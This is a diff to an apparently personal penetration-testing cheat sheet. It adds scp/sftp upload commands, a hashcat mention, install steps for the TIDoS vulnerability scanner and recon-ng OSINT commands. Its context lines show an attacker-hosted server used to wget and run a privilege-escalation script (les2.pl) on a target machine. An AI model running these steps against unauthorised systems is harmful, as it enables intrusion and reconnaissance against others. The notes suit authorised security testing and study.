@@ -301,6 +301,12 @@ sudo nmap -sV --scripts=vulscan xxxx
 
 #############################
 
+## password crackers 
+hashcat 
+scp <file to upload> <username>@<hostname>:<destination path>
+scp -r <directory to upload> <username>@<hostname>:<destination path> # dir scp
+echo "put files*.xml" | sftp -p -i ~/.ssh/key_name username@hostname.example #u using relative loc
+sftp -b batchfile.txt ~/.ssh/key_name username@hostname.example # using batch in text
 
 
 
@@ -544,6 +550,36 @@ python2 -m SimpleHttpServer
 wget xxx.xxx/les2.pl # from SimpleHttpServer on to target machine 
 chmod +x les2.pl 
 ./les2.pl ## to run the module --> its on the target PC 
+
+###### TIDoS ---> probe webapps for vulnerabilities 
+# https://null-byte.wonderhowto.com/how-to/probe-websites-for-vulnerabilities-more-easily-with-tidos-framework-0193854/
+git clone https://github.com/0xinfection/tidos-framework.git
+cd tidos-framework
+sudo apt-get install libncurses5 libxml2 nmap tcpdump libexiv2-dev build-essential python-pip default-libmysqlclient-dev python-xmpp
+sudo pip2 install -r requirements.txt 
+chmod +x install
+./install
+sudo tidos 
+
+
+### RECON-NG --> contains modules simular to metasploit 
+##### GREAT FOR OSNIT 
+git clone 'https://github.com/lanmaster53/recon-ng'
+workspaces add ws1 ## CERATE WORKSPACE
+show workspaces 
+workspaces select default 
+show modules 
+add domains ### USE THIS THIS TO ADD TO DATA TABLE FOR EXPLOIT 
+show domains 
+add companies 
+show companies 
+search whois # displays modules that exist for whois 
+use whois_pocs 
+show info ## displays module info and the data structure user provided 
+show # displays information to be used in console 
+show dashboard ## shows all current activities / tasks peformed 
+add # need to 
+#####################################
 
 
 
